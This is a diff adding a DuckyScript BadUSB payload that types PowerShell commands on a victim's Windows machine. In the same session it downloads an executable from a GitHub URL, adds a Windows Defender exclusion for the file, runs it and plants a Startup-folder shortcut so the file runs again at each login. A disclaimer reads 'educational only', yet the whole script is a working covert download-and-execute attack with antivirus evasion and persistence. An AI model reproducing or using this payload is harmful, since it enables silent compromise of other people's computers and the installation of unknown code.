@@ -1,0 +1,42 @@
+REM Hidden install of python exe
+
+REM ONCE AGAIN DO NOT USE FOR MALIOUS ACTIVITY!!!!! EDUCATIONAL ONLY.
+
+DEFAULT_DELAY 200
+DELAY 1500
+
+REM Open PowerShell
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+
+REM Change to root
+STRING cd \
+ENTER
+DELAY 500
+
+REM Download the EXE to Downloads
+STRING powershell -Command "Invoke-WebRequest -Uri 'https://github.com/SuperNinjaCat5/BadUsb_DuckyScript/raw/refs/heads/main/python_setup/dist/main.exe' -OutFile $env:USERPROFILE\Downloads\main.exe"
+ENTER
+DELAY 1000
+
+REM Change to Downloads
+STRING cd $env:USERPROFILE\Downloads
+ENTER
+DELAY 500
+
+REM Add Defender exclusion
+STRING Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads\main.exe"
+ENTER
+DELAY 500
+
+REM Run the EXE
+STRING .\main.exe
+ENTER
+DELAY 1000
+
+REM Add to Startup
+STRING powershell -Command "$sc='$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MyApp.lnk';$tg='$env:USERPROFILE\\Downloads\\main.exe';$sh=New-Object -ComObject WScript.Shell;$s=$sh.CreateShortcut($sc);$s.TargetPath=$tg;$s.Save()"
+ENTER
